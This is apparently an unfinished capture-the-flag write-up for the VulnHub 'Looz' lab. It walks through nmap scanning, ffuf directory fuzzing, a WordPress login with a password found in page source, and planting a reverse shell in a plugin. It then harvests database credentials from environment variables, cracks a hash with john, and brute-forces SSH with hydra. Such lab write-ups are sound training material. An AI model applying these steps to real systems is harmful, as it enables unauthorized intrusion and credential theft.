# Looz - Not completed

![image](https://user-images.githubusercontent.com/5285547/129017281-3bfca710-1e46-4e57-bac6-7a1926977155.png)

Room link: https://www.vulnhub.com/entry/looz-1,732/

## Enum

Nmap 

```
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
3306/tcp open   mysql
8081/tcp open   blackice-icecap


PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:80:23:86:76:97:19:09:9d:50:b1:94:c9:8d:a5:0c (RSA)
|   256 3d:52:5e:29:fb:2f:29:e8:01:e4:5d:1b:a1:1e:f3:4b (ECDSA)
|_  256 f0:f4:77:dc:3d:53:c3:c5:35:82:87:a5:ba:57:b4:49 (ED25519)
80/tcp   open   http         nginx 1.18.0 (Ubuntu)
|_http-generator: Nicepage 3.15.3, nicepage.com
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Home
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
3306/tcp open   mysql        MySQL 5.5.5-10.5.10-MariaDB-1:10.5.10+maria~focal
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.5.10-MariaDB-1:10.5.10+maria~focal
|   Thread ID: 13
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, LongColumnFlag, Speaks41ProtocolOld, SupportsTransactions, FoundRows, Support41Auth, ODBCClient, SupportsCompression, InteractiveClient, Speaks41ProtocolNew, IgnoreSigpipes, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Mt~Ae[v`^78Qpar;l3U6
|_  Auth Plugin Name: mysql_native_password
8081/tcp open   http         Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://jetty/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Port 80

Main Page

![image](https://user-images.githubusercontent.com/5285547/129017511-3631397f-2b74-4d52-8cae-d4ab8b2c36a4.png)

Looking at the sourcecode of the page we see a password for a user John.

![image](https://user-images.githubusercontent.com/5285547/129017594-fe58c1bc-9223-459b-ac24-11f5d28b88dd.png)

```
john:y0uC@n'tbr3akIT
```

## Port 8081

I only got redirected back to port 80, so tried to brute force the directories. 

```
ffuf -u http://192.168.1.121:8081/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt

wp-admin                [Status: 301, Size: 324, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 327, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 326, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
```

Going to http://192.168.1.121/wp-admin redirected me to 

```
http://wp.looz.com/wp-login.php?redirect_to=http%3A%2F%2Fjetty%3A8081%2Fwp-admin%2F&reauth=1
```

Adding wp.looz.com to /etc/hosts I can then see the login page. 

After loggin in as john, I seen akismet plugin was editable so added a PHP reverse shell to the plugin and updated the file. 
Activatiing the pluing after gave me the shell back. 

Time to enumerate the system to see what we can find. 

env

```
PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgi
APACHE_CONFDIR=/etc/apache2
MYSQL_ENV_GPG_KEYS=177F4010FE56CA3336300305F1656F24C74CD1D8
HOSTNAME=a5610f5f2480
PHP_INI_DIR=/usr/local/etc/php
MYSQL_ENV_MARIADB_VERSION=1:10.5.10+maria~focal
SHLVL=0
PHP_EXTRA_BUILD_DEPS=apache2-dev
OLDPWD=/var/www
MYSQL_ENV_MYSQL_DATABASE=wpdb
PHP_LDFLAGS=-Wl,-O1 -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=7.4.20
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312
WORDPRESS_DB_PASSWORD=Ba2k3t
PHP_ASC_URL=https://www.php.net/distributions/php-7.4.20.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_URL=https://www.php.net/distributions/php-7.4.20.tar.xz
TERM=xterm
WORDPRESS_DB_USER=dbadmin
MYSQL_PORT_3306_TCP_ADDR=172.17.0.2
MYSQL_ENV_MYSQL_ROOT_PASSWORD=root-password
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MYSQL_ENV_GOSU_VERSION=1.12
MYSQL_PORT_3306_TCP_PORT=3306
APACHE_LOCK_DIR=/var/lock/apache2
MYSQL_PORT_3306_TCP_PROTO=tcp
LANG=C
MYSQL_ENV_MARIADB_MAJOR=10.5
WORDPRESS_DB_NAME=wpdb
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
MYSQL_PORT=tcp://172.17.0.2:3306
MYSQL_ENV_MYSQL_PASSWORD=Ba2k3t
APACHE_LOG_DIR=/var/log/apache2
MYSQL_PORT_3306_TCP=tcp://172.17.0.2:3306
MYSQL_NAME=/wpcontainer/mysql
PWD=/var/www/html
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev  make             pkg-config              re2c
MYSQL_ENV_MYSQL_USER=dbadmin
PHP_SHA256=1fa46ca6790d780bf2cb48961df65f0ca3640c4533f0bca743cd61b71cb66335
APACHE_ENVVARS=/etc/apache2/envvars
```

Found creds in the env, which also points to being in a docker container. 

Mysql

```
mysql -u dbadmin -p 
Ba2k3t
```

![image](https://user-images.githubusercontent.com/5285547/129023470-f4468619-6842-469c-aead-75080c6feab6.png)

![image](https://user-images.githubusercontent.com/5285547/129023572-fb616155-d3d8-4bf5-ae59-5dc601f93ac3.png)


## Password Crack. 

Having the hash for all the users, I managed to crack one called gandalf

gandolf:$P$BGOXSxRtzMKFKkRZ246loTIXH5AFQm/:PASSWORD_REDACTED

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Trying this password for the ssh connection seemed to fail, so back to brute force of all users 

```
echo "john william james Evelyn Mason harper gandalf" | tr " " "\n" > users.txt
hydra  -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.121 -f -V
```

